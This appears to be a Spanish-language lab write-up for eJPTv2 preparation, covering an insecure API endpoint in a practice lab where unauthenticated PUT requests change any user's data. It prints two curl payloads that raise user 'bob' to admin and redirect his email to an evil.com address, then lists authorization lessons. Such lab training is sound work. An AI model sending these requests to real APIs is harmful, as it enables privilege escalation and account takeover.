# 🔓 Informe de Laboratorio: HackLabs - A08 Software & Data Integrity Failures (Easy)
**IP Objetivo:** 10.10.10.143 | **Fecha:** 29/04/2026 | **Objetivo:** Preparación eJPTv2

## 🎯 Objetivo
Demostrar una vulnerabilidad de fallo de integridad de software y datos en una API que permite la modificación no autorizada de propiedades de usuario, incluyendo la escalada de privilegios a administrador.

## 🔍 Fase 1: Enumeración
- Se accedió al laboratorio `A08 – Software & Data Integrity Failures` en `http://10.10.10.143`.
- La resolución indicaba que el endpoint `PUT /api/user/<id>` no verifica la propiedad del recurso.

## 💥 Fase 2: Explotación del Fallo de Integridad
- **Vulnerabilidad:** La API permite modificar cualquier usuario mediante una petición `PUT` sin validar que el solicitante sea el propietario de la cuenta o tenga permisos de administración.
- **Payload 1 – Escalada de Privilegios:**
    - `curl -X PUT http://10.10.10.143/api/user/3 -H "Content-Type: application/json" -d '{"role": "admin"}'`
    - **Resultado:** El usuario `bob` (ID 3) fue escalado a rol `admin`.
- **Payload 2 – Modificación de Email:**
    - `curl -X PUT http://10.10.10.143/api/user/3 -H "Content-Type: application/json" -d '{"role":"admin","email":"hacked@evil.com"}'`
    - **Resultado:** El email del usuario `bob` fue modificado a `hacked@evil.com`.

## 🧠 Lecciones Aprendidas
1.  **Autorización a Nivel de API:** Cada endpoint debe verificar que el usuario autenticado tiene permisos para modificar el recurso solicitado.
2.  **Propiedad del Recurso:** Un usuario solo debería poder modificar su propio perfil, a menos que tenga privilegios de administrador explícitos.
3.  **Integridad de Datos:** La falta de validación de propiedad puede llevar a la modificación masiva de datos y a la escalada de privilegios.

## 🏁 Conclusión
El laboratorio A08 demuestra cómo una API sin controles de integridad y autorización permite a un atacante modificar datos de cualquier usuario, incluyendo la escalada a administrador. Se recomienda implementar validación de propiedad en todos los endpoints de modificación de recursos.
